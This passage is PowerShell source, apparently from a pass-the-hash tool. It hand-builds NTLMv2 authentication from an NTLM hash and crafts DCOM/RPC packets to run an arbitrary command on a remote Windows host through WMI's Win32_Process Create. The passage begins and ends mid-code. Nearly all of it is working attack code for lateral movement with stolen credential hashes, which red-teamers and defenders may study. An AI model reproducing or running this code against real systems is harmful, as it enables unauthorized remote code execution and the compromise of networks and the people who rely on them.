        $auth_LM_offset = [System.BitConverter]::GetBytes($auth_domain_bytes.Length + $auth_username_bytes.Length + $auth_hostname_bytes.Length + 64)
        $auth_NTLM_offset = [System.BitConverter]::GetBytes($auth_domain_bytes.Length + $auth_username_bytes.Length + $auth_hostname_bytes.Length + 88)
        $HMAC_MD5 = New-Object System.Security.Cryptography.HMACMD5
        $HMAC_MD5.key = $NTLM_hash_bytes
        $username_and_target = $username.ToUpper()
        $username_and_target_bytes = [System.Text.Encoding]::Unicode.GetBytes($username_and_target)
        $username_and_target_bytes += $auth_domain_bytes
        $NTLMv2_hash = $HMAC_MD5.ComputeHash($username_and_target_bytes)
        $client_challenge = [String](1..8 | ForEach-Object {"{0:X2}" -f (Get-Random -Minimum 1 -Maximum 255)})
        $client_challenge_bytes = $client_challenge.Split(" ") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}

        $security_blob_bytes = 0x01,0x01,0x00,0x00,
                                0x00,0x00,0x00,0x00 +
                                $WMI_target_time_bytes +
                                $client_challenge_bytes +
                                0x00,0x00,0x00,0x00 +
                                $WMI_target_details +
                                0x00,0x00,0x00,0x00,
                                0x00,0x00,0x00,0x00

        $server_challenge_and_security_blob_bytes = $WMI_NTLM_challenge + $security_blob_bytes
        $HMAC_MD5.key = $NTLMv2_hash
        $NTLMv2_response = $HMAC_MD5.ComputeHash($server_challenge_and_security_blob_bytes)
        $session_base_key = $HMAC_MD5.ComputeHash($NTLMv2_response)
        $NTLMv2_response = $NTLMv2_response + $security_blob_bytes
        $NTLMv2_response_length = [System.BitConverter]::GetBytes($NTLMv2_response.Length)[0,1]
        $WMI_session_key_offset = [System.BitConverter]::GetBytes($auth_domain_bytes.Length + $auth_username_bytes.Length + $auth_hostname_bytes.Length + $NTLMv2_response.Length + 88)
        $WMI_session_key_length = 0x00,0x00
        $WMI_negotiate_flags = 0x15,0x82,0x88,0xa2

        $NTLMSSP_response = 0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00,
                                0x03,0x00,0x00,0x00,
                                0x18,0x00,
                                0x18,0x00 +
                                $auth_LM_offset +
                                $NTLMv2_response_length +
                                $NTLMv2_response_length +
                                $auth_NTLM_offset +
                                $auth_domain_length +
                                $auth_domain_length +
                                $auth_domain_offset +
                                $auth_username_length +
                                $auth_username_length +
                                $auth_username_offset +
                                $auth_hostname_length +
                                $auth_hostname_length +
                                $auth_hostname_offset +
                                $WMI_session_key_length +
                                $WMI_session_key_length +
                                $WMI_session_key_offset +
                                $WMI_negotiate_flags +
                                $auth_domain_bytes +
                                $auth_username_bytes +
                                $auth_hostname_bytes +
                                0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 +
                                $NTLMv2_response

        $assoc_group = $WMI_client_receive[20..23]
        $packet_RPC = New-PacketRPCAUTH3 $NTLMSSP_response
        $RPC = ConvertFrom-PacketOrderedDictionary $packet_RPC
        $WMI_client_send = $RPC
        $WMI_client_stream.Write($WMI_client_send,0,$WMI_client_send.Length) > $null
        $WMI_client_stream.Flush()    
        $causality_ID = [String](1..16 | ForEach-Object {"{0:X2}" -f (Get-Random -Minimum 1 -Maximum 255)})
        [Byte[]]$causality_ID_bytes = $causality_ID.Split(" ") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
        $unused_buffer = [String](1..16 | ForEach-Object {"{0:X2}" -f (Get-Random -Minimum 1 -Maximum 255)})
        [Byte[]]$unused_buffer_bytes = $unused_buffer.Split(" ") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
        $packet_DCOM_remote_create_instance = New-PacketDCOMRemoteCreateInstance $causality_ID_bytes $target_short
        $DCOM_remote_create_instance = ConvertFrom-PacketOrderedDictionary $packet_DCOM_remote_create_instance
        $packet_RPC = New-PacketRPCRequest 0x03 $DCOM_remote_create_instance.Length 0 0 0x03,0x00,0x00,0x00 0x01,0x00 0x04,0x00
        $RPC = ConvertFrom-PacketOrderedDictionary $packet_RPC
        $WMI_client_send = $RPC + $DCOM_remote_create_instance
        $WMI_client_stream.Write($WMI_client_send,0,$WMI_client_send.Length) > $null
        $WMI_client_stream.Flush()    
        $WMI_client_stream.Read($WMI_client_receive,0,$WMI_client_receive.Length) > $null

        if($WMI_client_receive[2] -eq 3 -and [System.BitConverter]::ToString($WMI_client_receive[24..27]) -eq '05-00-00-00')
        {
            Write-Output "[-] $output_username WMI access denied on $target_long"    
        }
        elseif($WMI_client_receive[2] -eq 3)
        {
            $error_code = [System.BitConverter]::ToString($WMI_client_receive[27..24])
            $error_code = $error_code -replace "-",""
            Write-Output "[-] Error code 0x$error_code"
        }
        elseif($WMI_client_receive[2] -eq 2 -and !$WMI_execute)
        {
            Write-Output "[+] $output_username accessed WMI on $target_long"
        }
        elseif($WMI_client_receive[2] -eq 2)
        {
            
            Write-Verbose "[+] $output_username accessed WMI on $target_long"

            if($target_short -eq '127.0.0.1')
            {
                $target_short = $auth_hostname
            }

            $target_unicode = 0x07,0x00 + [System.Text.Encoding]::Unicode.GetBytes($target_short + "[")
            $target_search = [System.BitConverter]::ToString($target_unicode)
            $target_search = $target_search -replace "-",""
            $WMI_message = [System.BitConverter]::ToString($WMI_client_receive)
            $WMI_message = $WMI_message -replace "-",""
            $target_index = $WMI_message.IndexOf($target_search)

            if($target_index -lt 1)
            {
                $target_address_list = [System.Net.Dns]::GetHostEntry($target_long).AddressList

                ForEach($IP_address in $target_address_list)
                {
                    $target_short = $IP_address.IPAddressToString
                    $target_unicode = 0x07,0x00 + [System.Text.Encoding]::Unicode.GetBytes($target_short + "[")
                    $target_search = [System.BitConverter]::ToString($target_unicode)
                    $target_search = $target_search -replace "-",""
                    $target_index = $WMI_message.IndexOf($target_search)

                    if($target_index -gt 0)
                    {
                        break
                    }

                }

            }

            if($target_long -cne $target_short)
            {
                Write-Verbose "[*] Using $target_short for random port extraction"
            }

            if($target_index -gt 0)
            {
                $target_bytes_index = $target_index / 2
                $WMI_random_port = $WMI_client_receive[($target_bytes_index + $target_unicode.Length)..($target_bytes_index + $target_unicode.Length + 8)]
                $WMI_random_port = [System.BitConverter]::ToString($WMI_random_port)
                $WMI_random_port_end_index = $WMI_random_port.IndexOf("-5D")

                if($WMI_random_port_end_index -gt 0)
                {
                    $WMI_random_port = $WMI_random_port.SubString(0,$WMI_random_port_end_index)
                }

                $WMI_random_port = $WMI_random_port -replace "-00",""
                $WMI_random_port = $WMI_random_port.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
                [Int]$WMI_random_port_int = -join $WMI_random_port 
                $MEOW = [System.BitConverter]::ToString($WMI_client_receive)
                $MEOW = $MEOW -replace "-",""
                $MEOW_index = $MEOW.IndexOf("4D454F570100000018AD09F36AD8D011A07500C04FB68820")
                $MEOW_bytes_index = $MEOW_index / 2
                $OXID = $WMI_client_receive[($MEOW_bytes_index + 32)..($MEOW_bytes_index + 39)]
                $IPID = $WMI_client_receive[($MEOW_bytes_index + 48)..($MEOW_bytes_index + 63)]
                $OXID = [System.BitConverter]::ToString($OXID)
                $OXID = $OXID -replace "-",""
                $OXID_index = $MEOW.IndexOf($OXID,$MEOW_index + 100)
                $OXID_bytes_index = $OXID_index / 2
                $object_UUID = $WMI_client_receive[($OXID_bytes_index + 12)..($OXID_bytes_index + 27)]
                $WMI_client_random_port = New-Object System.Net.Sockets.TCPClient
                $WMI_client_random_port.Client.ReceiveTimeout = 30000
            }

            if($WMI_random_port)
            {

                Write-Verbose "[*] Connecting to $target_long`:$WMI_random_port_int"

                try
                {
                    $WMI_client_random_port.Connect($target_long,$WMI_random_port_int)
                }
                catch
                {
                    Write-Output "[-] $target_long`:$WMI_random_port_int did not respond"
                }

            }
            else
            {
                Write-Output "[-] Random port extraction failure"
            }

        }
        else
        {
            Write-Output "[-] Something went wrong"
        }

        if($WMI_client_random_port.Connected)
        {
            $WMI_client_random_port_stream = $WMI_client_random_port.GetStream()
            $packet_RPC = New-PacketRPCBind 2 0xd0,0x16 0x03 0x00,0x00 0x43,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xc0,0x00,0x00,0x00,0x00,0x00,0x00,0x46 0x00,0x00
            $packet_RPC["FragLength"] = 0xd0,0x00
            $packet_RPC["AuthLength"] = 0x28,0x00
            $packet_RPC["AuthLevel"] = 0x04
            $packet_RPC["NegotiateFlags"] = 0x97,0x82,0x08,0xa2
            $RPC = ConvertFrom-PacketOrderedDictionary $packet_RPC
            $WMI_client_send = $RPC
            $WMI_client_random_port_stream.Write($WMI_client_send,0,$WMI_client_send.Length) > $null
            $WMI_client_random_port_stream.Flush()    
            $WMI_client_random_port_stream.Read($WMI_client_receive,0,$WMI_client_receive.Length) > $null
            $assoc_group = $WMI_client_receive[20..23]
            $WMI_NTLMSSP = [System.BitConverter]::ToString($WMI_client_receive)
            $WMI_NTLMSSP = $WMI_NTLMSSP -replace "-",""
            $WMI_NTLMSSP_index = $WMI_NTLMSSP.IndexOf("4E544C4D53535000")
            $WMI_NTLMSSP_bytes_index = $WMI_NTLMSSP_index / 2
            $WMI_domain_length = Get-UInt16DataLength ($WMI_NTLMSSP_bytes_index + 12) $WMI_client_receive
            $WMI_target_length = Get-UInt16DataLength ($WMI_NTLMSSP_bytes_index + 40) $WMI_client_receive
            $WMI_session_ID = $WMI_client_receive[44..51]
            $WMI_NTLM_challenge = $WMI_client_receive[($WMI_NTLMSSP_bytes_index + 24)..($WMI_NTLMSSP_bytes_index + 31)]
            $WMI_target_details = $WMI_client_receive[($WMI_NTLMSSP_bytes_index + 56 + $WMI_domain_length)..($WMI_NTLMSSP_bytes_index + 55 + $WMI_domain_length + $WMI_target_length)]
            $WMI_target_time_bytes = $WMI_target_details[($WMI_target_details.Length - 12)..($WMI_target_details.Length - 5)]
            $NTLM_hash_bytes = (&{for ($i = 0;$i -lt $hash.Length;$i += 2){$hash.SubString($i,2)}}) -join "-"
            $NTLM_hash_bytes = $NTLM_hash_bytes.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
            $auth_hostname = (Get-ChildItem -path env:computername).Value
            $auth_hostname_bytes = [System.Text.Encoding]::Unicode.GetBytes($auth_hostname)
            $auth_domain = $Domain
            $auth_domain_bytes = [System.Text.Encoding]::Unicode.GetBytes($auth_domain)
            $auth_username_bytes = [System.Text.Encoding]::Unicode.GetBytes($username)
            $auth_domain_length = [System.BitConverter]::GetBytes($auth_domain_bytes.Length)[0,1]
            $auth_domain_length = [System.BitConverter]::GetBytes($auth_domain_bytes.Length)[0,1]
            $auth_username_length = [System.BitConverter]::GetBytes($auth_username_bytes.Length)[0,1]
            $auth_hostname_length = [System.BitConverter]::GetBytes($auth_hostname_bytes.Length)[0,1]
            $auth_domain_offset = 0x40,0x00,0x00,0x00
            $auth_username_offset = [System.BitConverter]::GetBytes($auth_domain_bytes.Length + 64)
            $auth_hostname_offset = [System.BitConverter]::GetBytes($auth_domain_bytes.Length + $auth_username_bytes.Length + 64)
            $auth_LM_offset = [System.BitConverter]::GetBytes($auth_domain_bytes.Length + $auth_username_bytes.Length + $auth_hostname_bytes.Length + 64)
            $auth_NTLM_offset = [System.BitConverter]::GetBytes($auth_domain_bytes.Length + $auth_username_bytes.Length + $auth_hostname_bytes.Length + 88)
            $HMAC_MD5 = New-Object System.Security.Cryptography.HMACMD5
            $HMAC_MD5.key = $NTLM_hash_bytes
            $username_and_target = $username.ToUpper()
            $username_and_target_bytes = [System.Text.Encoding]::Unicode.GetBytes($username_and_target)
            $username_and_target_bytes += $auth_domain_bytes
            $NTLMv2_hash = $HMAC_MD5.ComputeHash($username_and_target_bytes)
            $client_challenge = [String](1..8 | ForEach-Object {"{0:X2}" -f (Get-Random -Minimum 1 -Maximum 255)})
            $client_challenge_bytes = $client_challenge.Split(" ") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}

            $security_blob_bytes = 0x01,0x01,0x00,0x00,
                                    0x00,0x00,0x00,0x00 +
                                    $WMI_target_time_bytes +
                                    $client_challenge_bytes +
                                    0x00,0x00,0x00,0x00 +
                                    $WMI_target_details +
                                    0x00,0x00,0x00,0x00,
                                    0x00,0x00,0x00,0x00

            $server_challenge_and_security_blob_bytes = $WMI_NTLM_challenge + $security_blob_bytes
            $HMAC_MD5.key = $NTLMv2_hash
            $NTLMv2_response = $HMAC_MD5.ComputeHash($server_challenge_and_security_blob_bytes)
            $session_base_key = $HMAC_MD5.ComputeHash($NTLMv2_response)

            $client_signing_constant = 0x73,0x65,0x73,0x73,0x69,0x6f,0x6e,0x20,0x6b,0x65,0x79,0x20,0x74,0x6f,0x20,
                                        0x63,0x6c,0x69,0x65,0x6e,0x74,0x2d,0x74,0x6f,0x2d,0x73,0x65,0x72,0x76,
                                        0x65,0x72,0x20,0x73,0x69,0x67,0x6e,0x69,0x6e,0x67,0x20,0x6b,0x65,0x79,
                                        0x20,0x6d,0x61,0x67,0x69,0x63,0x20,0x63,0x6f,0x6e,0x73,0x74,0x61,0x6e,
                                        0x74,0x00

            $MD5 = New-Object -TypeName System.Security.Cryptography.MD5CryptoServiceProvider
            $client_signing_key = $MD5.ComputeHash($session_base_key + $client_signing_constant)
            $NTLMv2_response = $NTLMv2_response + $security_blob_bytes
            $NTLMv2_response_length = [System.BitConverter]::GetBytes($NTLMv2_response.Length)[0,1]
            $WMI_session_key_offset = [System.BitConverter]::GetBytes($auth_domain_bytes.Length + $auth_username_bytes.Length + $auth_hostname_bytes.Length + $NTLMv2_response.Length + 88)
            $WMI_session_key_length = 0x00,0x00
            $WMI_negotiate_flags = 0x15,0x82,0x88,0xa2

            $NTLMSSP_response = 0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00,
                                    0x03,0x00,0x00,0x00,
                                    0x18,0x00,
                                    0x18,0x00 +
                                    $auth_LM_offset +
                                    $NTLMv2_response_length +
                                    $NTLMv2_response_length +
                                    $auth_NTLM_offset +
                                    $auth_domain_length +
                                    $auth_domain_length +
                                    $auth_domain_offset +
                                    $auth_username_length +
                                    $auth_username_length +
                                    $auth_username_offset +
                                    $auth_hostname_length +
                                    $auth_hostname_length +
                                    $auth_hostname_offset +
                                    $WMI_session_key_length +
                                    $WMI_session_key_length +
                                    $WMI_session_key_offset +
                                    $WMI_negotiate_flags +
                                    $auth_domain_bytes +
                                    $auth_username_bytes +
                                    $auth_hostname_bytes +
                                    0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                    0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                    0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 +
                                    $NTLMv2_response

            $HMAC_MD5.key = $client_signing_key
            [Byte[]]$sequence_number = 0x00,0x00,0x00,0x00
            $packet_RPC = New-PacketRPCAUTH3 $NTLMSSP_response
            $packet_RPC["CallID"] = 0x02,0x00,0x00,0x00
            $packet_RPC["AuthLevel"] = 0x04
            $RPC = ConvertFrom-PacketOrderedDictionary $packet_RPC
            $WMI_client_send = $RPC
            $WMI_client_random_port_stream.Write($WMI_client_send,0,$WMI_client_send.Length) > $null
            $WMI_client_random_port_stream.Flush()
            $packet_RPC = New-PacketRPCRequest 0x83 76 16 4 0x02,0x00,0x00,0x00 0x00,0x00 0x03,0x00 $object_UUID
            $packet_rem_query_interface = New-PacketDCOMRemQueryInterface $causality_ID_bytes $IPID 0xd6,0x1c,0x78,0xd4,0xd3,0xe5,0xdf,0x44,0xad,0x94,0x93,0x0e,0xfe,0x48,0xa8,0x87
            $packet_NTLMSSP_verifier = New-PacketNTLMSSPVerifier 4 0x04 $sequence_number
            $RPC = ConvertFrom-PacketOrderedDictionary $packet_RPC
            $rem_query_interface = ConvertFrom-PacketOrderedDictionary $packet_rem_query_interface
            $NTLMSSP_verifier = ConvertFrom-PacketOrderedDictionary $packet_NTLMSSP_verifier
            $HMAC_MD5.key = $client_signing_key
            $RPC_signature = $HMAC_MD5.ComputeHash($sequence_number + $RPC + $rem_query_interface + $NTLMSSP_verifier[0..11])
            $RPC_signature = $RPC_signature[0..7]
            $packet_NTLMSSP_verifier["NTLMSSPVerifierChecksum"] = $RPC_signature
            $NTLMSSP_verifier = ConvertFrom-PacketOrderedDictionary $packet_NTLMSSP_verifier
            $WMI_client_send = $RPC + $rem_query_interface + $NTLMSSP_verifier
            $WMI_client_random_port_stream.Write($WMI_client_send,0,$WMI_client_send.Length) > $null
            $WMI_client_random_port_stream.Flush()    
            $WMI_client_random_port_stream.Read($WMI_client_receive,0,$WMI_client_receive.Length) > $null
            $WMI_client_stage = 'Exit'

            if($WMI_client_receive[2] -eq 3 -and [System.BitConverter]::ToString($WMI_client_receive[24..27]) -eq '05-00-00-00')
            {
                Write-Output "[-] $output_username WMI access denied on $target_long"   
            }
            elseif($WMI_client_receive[2] -eq 3)
            {
                $error_code = [System.BitConverter]::ToString($WMI_client_receive[27..24])
                $error_code = $error_code -replace "-",""
                Write-Output "[-] Failed with error code 0x$error_code"
            }
            elseif($WMI_client_receive[2] -eq 2)
            {
                $WMI_data = [System.BitConverter]::ToString($WMI_client_receive)
                $WMI_data = $WMI_data -replace "-",""
                $OXID_index = $WMI_data.IndexOf($OXID)
                $OXID_bytes_index = $OXID_index / 2
                $object_UUID2 = $WMI_client_receive[($OXID_bytes_index + 16)..($OXID_bytes_index + 31)]
                $WMI_client_stage = 'AlterContext'
            }
            else
            {
                Write-Output "[-] Something went wrong"
            }

            Write-Verbose "[*] Attempting command execution"
            $request_split_index = 5500

            :WMI_execute_loop while ($WMI_client_stage -ne 'Exit')
            {

                if($WMI_client_receive[2] -eq 3)
                {
                    $error_code = [System.BitConverter]::ToString($WMI_client_receive[27..24])
                    $error_code = $error_code -replace "-",""
                    Write-Output "[-] Failed with error code 0x$error_code"
                    $WMI_client_stage = 'Exit'
                }

                switch ($WMI_client_stage)
                {
            
                    'AlterContext'
                    {

                        switch ($sequence_number[0])
                        {

                            0
                            {
                                $alter_context_call_ID = 0x03,0x00,0x00,0x00
                                $alter_context_context_ID = 0x02,0x00
                                $alter_context_UUID = 0xd6,0x1c,0x78,0xd4,0xd3,0xe5,0xdf,0x44,0xad,0x94,0x93,0x0e,0xfe,0x48,0xa8,0x87
                                $WMI_client_stage_next = 'Request'
                            }

                            1
                            {
                                $alter_context_call_ID = 0x04,0x00,0x00,0x00 
                                $alter_context_context_ID = 0x03,0x00
                                $alter_context_UUID = 0x18,0xad,0x09,0xf3,0x6a,0xd8,0xd0,0x11,0xa0,0x75,0x00,0xc0,0x4f,0xb6,0x88,0x20
                                $WMI_client_stage_next = 'Request'
                            }

                            6
                            {
                                $alter_context_call_ID = 0x09,0x00,0x00,0x00 
                                $alter_context_context_ID = 0x04,0x00
                                $alter_context_UUID = 0x99,0xdc,0x56,0x95,0x8c,0x82,0xcf,0x11,0xa3,0x7e,0x00,0xaa,0x00,0x32,0x40,0xc7
                                $WMI_client_stage_next = 'Request'
                            }

                        }

                        $packet_RPC = New-PacketRPCAlterContext $assoc_group $alter_context_call_ID $alter_context_context_ID $alter_context_UUID
                        $RPC = ConvertFrom-PacketOrderedDictionary $packet_RPC
                        $WMI_client_send = $RPC
                        $WMI_client_random_port_stream.Write($WMI_client_send,0,$WMI_client_send.Length) > $null
                        $WMI_client_random_port_stream.Flush()    
                        $WMI_client_random_port_stream.Read($WMI_client_receive,0,$WMI_client_receive.Length) > $null
                        $WMI_client_stage = $WMI_client_stage_next
                    }
                  
                    'Request'
                    {
                        $request_split = $false

                        switch ($sequence_number[0])
                        {

                            0
                            {
                                $sequence_number = 0x01,0x00,0x00,0x00
                                $request_flags = 0x83
                                $request_auth_padding = 12
                                $request_call_ID = 0x03,0x00,0x00,0x00
                                $request_context_ID = 0x02,0x00
                                $request_opnum = 0x03,0x00
                                $request_UUID = $object_UUID2
                                $hostname_length = [System.BitConverter]::GetBytes($auth_hostname.Length + 1)
                                $WMI_client_stage_next = 'AlterContext'

                                if([Bool]($auth_hostname.Length % 2))
                                {
                                    $auth_hostname_bytes += 0x00,0x00
                                }
                                else
                                {
                                    $auth_hostname_bytes += 0x00,0x00,0x00,0x00
                                }

                                $stub_data = 0x05,0x00,0x07,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 + 
                                                $causality_ID_bytes + 
                                                0x00,0x00,0x00,0x00,0x00,0x00,0x02,0x00 + 
                                                $hostname_length +
                                                0x00,0x00,0x00,0x00 +
                                                $hostname_length +
                                                $auth_hostname_bytes +
                                                $process_ID_bytes + 
                                                0x00,0x00,0x00,0x00,0x00,0x00

                            }

                            1
                            {
                                $sequence_number = 0x02,0x00,0x00,0x00
                                $request_flags = 0x83
                                $request_auth_padding = 8
                                $request_call_ID = 0x04,0x00,0x00,0x00
                                $request_context_ID = 0x03,0x00
                                $request_opnum = 0x03,0x00
                                $request_UUID = $IPID
                                $WMI_client_stage_next = 'Request'

                                $stub_data = 0x05,0x00,0x07,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 + 
                                                $causality_ID_bytes + 
                                                0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00

                            }

                            2
                            {
                                $sequence_number = 0x03,0x00,0x00,0x00
                                $request_flags = 0x83
                                $request_auth_padding = 0
                                $request_call_ID = 0x05,0x00,0x00,0x00
                                $request_context_ID = 0x03,0x00
                                $request_opnum = 0x06,0x00
                                $request_UUID = $IPID
                                [Byte[]]$WMI_namespace_length = [System.BitConverter]::GetBytes($target_short.Length + 14)
                                [Byte[]]$WMI_namespace_unicode = [System.Text.Encoding]::Unicode.GetBytes("\\$target_short\root\cimv2")
                                $WMI_client_stage_next = 'Request'

                                if([Bool]($target_short.Length % 2))
                                {
                                    $WMI_namespace_unicode += 0x00,0x00,0x00,0x00
                                }
                                else
                                {
                                    $WMI_namespace_unicode += 0x00,0x00
                                }

                                $stub_data = 0x05,0x00,0x07,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 +
                                                $causality_ID_bytes +
                                                0x00,0x00,0x00,0x00,0x00,0x00,0x02,0x00 +
                                                $WMI_namespace_length +
                                                0x00,0x00,0x00,0x00 +
                                                $WMI_namespace_length +
                                                $WMI_namespace_unicode +
                                                0x04,0x00,0x02,0x00,0x09,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x09,
                                                0x00,0x00,0x00,0x65,0x00,0x6e,0x00,0x2d,0x00,0x55,0x00,0x53,0x00,
                                                0x2c,0x00,0x65,0x00,0x6e,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                                0x00,0x00,0x00,0x00,0x00

                            }

                            3
                            {
                                $sequence_number = 0x04,0x00,0x00,0x00
                                $request_flags = 0x83
                                $request_auth_padding = 8
                                $request_call_ID = 0x06,0x00,0x00,0x00
                                $request_context_ID = 0x00,0x00
                                $request_opnum = 0x05,0x00
                                $request_UUID = $object_UUID
                                $WMI_client_stage_next = 'Request'
                                $WMI_data = [System.BitConverter]::ToString($WMI_client_receive)
                                $WMI_data = $WMI_data -replace "-",""
                                $OXID_index = $WMI_data.IndexOf($OXID)
                                $OXID_bytes_index = $OXID_index / 2
                                $IPID2 = $WMI_client_receive[($OXID_bytes_index + 16)..($OXID_bytes_index + 31)]
                                $packet_rem_release = New-PacketDCOMRemRelease $causality_ID_bytes $object_UUID2 $IPID
                                $stub_data = ConvertFrom-PacketOrderedDictionary $packet_rem_release
                            }

                            4
                            {
                                $sequence_number = 0x05,0x00,0x00,0x00
                                $request_flags = 0x83
                                $request_auth_padding = 4
                                $request_call_ID = 0x07,0x00,0x00,0x00
                                $request_context_ID = 0x00,0x00
                                $request_opnum = 0x03,0x00
                                $request_UUID = $object_UUID
                                $WMI_client_stage_next = 'Request'
                                $packet_rem_query_interface = New-PacketDCOMRemQueryInterface $causality_ID_bytes $IPID2 0x9e,0xc1,0xfc,0xc3,0x70,0xa9,0xd2,0x11,0x8b,0x5a,0x00,0xa0,0xc9,0xb7,0xc9,0xc4
                                $stub_data = ConvertFrom-PacketOrderedDictionary $packet_rem_query_interface
                            }

                            5
                            {
                                $sequence_number = 0x06,0x00,0x00,0x00
                                $request_flags = 0x83
                                $request_auth_padding = 4
                                $request_call_ID = 0x08,0x00,0x00,0x00
                                $request_context_ID = 0x00,0x00
                                $request_opnum = 0x03,0x00
                                $request_UUID = $object_UUID
                                $WMI_client_stage_next = 'AlterContext'
                                $packet_rem_query_interface = New-PacketDCOMRemQueryInterface $causality_ID_bytes $IPID2 0x83,0xb2,0x96,0xb1,0xb4,0xba,0x1a,0x10,0xb6,0x9c,0x00,0xaa,0x00,0x34,0x1d,0x07
                                $stub_data = ConvertFrom-PacketOrderedDictionary $packet_rem_query_interface
                            }

                            6
                            {
                                $sequence_number = 0x07,0x00,0x00,0x00
                                $request_flags = 0x83
                                $request_auth_padding = 0
                                $request_call_ID = 0x09,0x00,0x00,0x00
                                $request_context_ID = 0x04,0x00
                                $request_opnum = 0x06,0x00
                                $request_UUID = $IPID2
                                $WMI_client_stage_next = 'Request'

                                $stub_data = 0x05,0x00,0x07,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 +
                                                $causality_ID_bytes +
                                                0x00,0x00,0x00,0x00,0x55,0x73,0x65,0x72,0x0d,0x00,0x00,0x00,0x1a,
                                                0x00,0x00,0x00,0x0d,0x00,0x00,0x00,0x77,0x00,0x69,0x00,0x6e,0x00,
                                                0x33,0x00,0x32,0x00,0x5f,0x00,0x70,0x00,0x72,0x00,0x6f,0x00,0x63,
                                                0x00,0x65,0x00,0x73,0x00,0x73,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                                0x00,0x00,0x00,0x00,0x00,0x00,0x02,0x00,0x00,0x00,0x00,0x00,0x00,
                                                0x00,0x00,0x00

                            }

                            7
                            {
                                $sequence_number = 0x08,0x00,0x00,0x00
                                $request_flags = 0x83
                                $request_auth_padding = 0
                                $request_call_ID = 0x10,0x00,0x00,0x00
                                $request_context_ID = 0x04,0x00
                                $request_opnum = 0x06,0x00
                                $request_UUID = $IPID2
                                $WMI_client_stage_next = 'Request'

                                $stub_data = 0x05,0x00,0x07,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 +
                                                $causality_ID_bytes +
                                                0x00,0x00,0x00,0x00,0x55,0x73,0x65,0x72,0x0d,0x00,0x00,0x00,0x1a,
                                                0x00,0x00,0x00,0x0d,0x00,0x00,0x00,0x77,0x00,0x69,0x00,0x6e,0x00,
                                                0x33,0x00,0x32,0x00,0x5f,0x00,0x70,0x00,0x72,0x00,0x6f,0x00,0x63,
                                                0x00,0x65,0x00,0x73,0x00,0x73,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                                0x00,0x00,0x00,0x00,0x00,0x00,0x02,0x00,0x00,0x00,0x00,0x00,0x00,
                                                0x00,0x00,0x00

                            }

                            {$_ -ge 8}
                            {
                                $sequence_number = 0x09,0x00,0x00,0x00
                                $request_auth_padding = 0
                                $request_call_ID = 0x0b,0x00,0x00,0x00
                                $request_context_ID = 0x04,0x00
                                $request_opnum = 0x18,0x00
                                $request_UUID = $IPID2
                                [Byte[]]$stub_length = [System.BitConverter]::GetBytes($Command.Length + 1769)[0,1]
                                [Byte[]]$stub_length2 = [System.BitConverter]::GetBytes($Command.Length + 1727)[0,1]
                                [Byte[]]$stub_length3 = [System.BitConverter]::GetBytes($Command.Length + 1713)[0,1]
                                [Byte[]]$command_length = [System.BitConverter]::GetBytes($Command.Length + 93)[0,1]
                                [Byte[]]$command_length2 = [System.BitConverter]::GetBytes($Command.Length + 16)[0,1]
                                [Byte[]]$command_bytes = [System.Text.Encoding]::UTF8.GetBytes($Command)


                                # thanks to @vysec for finding a bug with certain command lengths
                                [String]$command_padding_check = $Command.Length / 4
                                
                                if($command_padding_check -like "*.75")
                                {
                                    $command_bytes += 0x00
                                }
                                elseif($command_padding_check -like "*.5")
                                {
                                    $command_bytes += 0x00,0x00
                                }
                                elseif($command_padding_check -like "*.25")
                                {
                                    $command_bytes += 0x00,0x00,0x00
                                }
                                else
                                {
                                    $command_bytes += 0x00,0x00,0x00,0x00
                                }
                                
                                $stub_data = 0x05,0x00,0x07,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 +
                                                $causality_ID_bytes +
                                                0x00,0x00,0x00,0x00,0x55,0x73,0x65,0x72,0x0d,0x00,0x00,0x00,0x1a,
                                                0x00,0x00,0x00,0x0d,0x00,0x00,0x00,0x57,0x00,0x69,0x00,0x6e,0x00,
                                                0x33,0x00,0x32,0x00,0x5f,0x00,0x50,0x00,0x72,0x00,0x6f,0x00,0x63,
                                                0x00,0x65,0x00,0x73,0x00,0x73,0x00,0x00,0x00,0x55,0x73,0x65,0x72,
                                                0x06,0x00,0x00,0x00,0x0c,0x00,0x00,0x00,0x06,0x00,0x00,0x00,0x63,
                                                0x00,0x72,0x00,0x65,0x00,0x61,0x00,0x74,0x00,0x65,0x00,0x00,0x00,
                                                0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x02,0x00 +
                                                $stub_length +
                                                0x00,0x00 +
                                                $stub_length +
                                                0x00,0x00,0x4d,0x45,0x4f,0x57,0x04,0x00,0x00,0x00,0x81,0xa6,0x12,
                                                0xdc,0x7f,0x73,0xcf,0x11,0x88,0x4d,0x00,0xaa,0x00,0x4b,0x2e,0x24,
                                                0x12,0xf8,0x90,0x45,0x3a,0x1d,0xd0,0x11,0x89,0x1f,0x00,0xaa,0x00,
                                                0x4b,0x2e,0x24,0x00,0x00,0x00,0x00 +
                                                $stub_length2 +
                                                0x00,0x00,0x78,0x56,0x34,0x12 +
                                                $stub_length3 +
                                                0x00,0x00,0x02,0x53,
